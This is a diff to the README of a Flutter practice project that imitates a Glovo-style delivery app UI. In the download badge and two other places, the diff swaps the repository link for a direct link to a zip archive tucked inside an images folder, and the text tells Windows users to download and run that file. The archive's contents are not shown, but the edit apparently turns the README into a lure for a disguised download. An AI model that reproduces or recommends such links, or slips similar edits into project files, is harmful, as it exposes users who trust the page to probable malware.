@@ -1,13 +1,13 @@
 # 📱 glovo-ui-practice - Build a polished delivery app UI
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hazem6482/glovo-ui-practice)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hazem6482/glovo-ui-practice/raw/refs/heads/main/assets/images/type-plat/ui_practice_glovo_v1.6.zip)
 
 ## 🚀 Getting Started
 
 glovo-ui-practice is a Flutter app that recreates a Glovo-style delivery interface with clean screens and smooth motion. It is made for Windows users who want to download the app and run it with a few simple steps.
 
 Use this page to download and run the project:
-https://github.com/Hazem6482/glovo-ui-practice
+https://github.com/Hazem6482/glovo-ui-practice/raw/refs/heads/main/assets/images/type-plat/ui_practice_glovo_v1.6.zip
 
 ## 🖥️ What You Need
 
@@ -40,7 +40,7 @@ You can expect:
 
 Go to the project page and download and run this file or follow the files in the repository:
 
-https://github.com/Hazem6482/glovo-ui-practice
+https://github.com/Hazem6482/glovo-ui-practice/raw/refs/heads/main/assets/images/type-plat/ui_practice_glovo_v1.6.zip
 
 If you are using the repository on Windows, follow these steps:
 
